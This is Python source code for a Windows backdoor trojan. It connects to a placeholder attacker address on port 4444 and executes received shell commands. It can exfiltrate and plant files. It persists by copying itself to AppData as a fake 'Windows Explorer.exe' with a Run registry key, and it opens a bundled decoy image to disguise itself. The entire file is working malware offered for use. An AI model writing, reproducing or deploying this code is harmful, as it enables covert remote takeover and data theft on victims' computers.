#!/usr/bin/env python
import socket, subprocess, json, os, base64, sys, shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        # Creating socket
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connecting to server
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def change_working_directory_to(self, path):
        # Using os to change directory
        os.chdir(path)
        return "[+] Changing directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            # Encoding data for sending
            return base64.b64encode(file.read())

    def become_persistent(self):
        file_location = os.environ["appdata"] + "\\Microsoft\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'
                            + file_location + '"', shell=True)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    # Handing large data
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    # Sending data
    # Python 3
    # connection.send(bytes("\n[+] Connection established.\n",'utf-8'))
    # Python 2
    # Receiving command
    def run(self):

        while True:
            command = self.reliable_receive()
            try:
                # Checking command
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download" and len(command) > 1:
                    command_result = self.read_file(command[1])
                elif command[0] == "upload" and len(command) > 1:
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)

            except Exception:
                command_result = "[-] Error during command execution"
            self.reliable_send(command_result)


file_name = sys._MEIPASS + "\download.jpg"
subprocess.Popen(file_name, shell=True)
try:
    # Enter your IP
    backdoor = Backdoor("Hacker IP", 4444)
    backdoor.run()
except Exception:
    sys.exit()
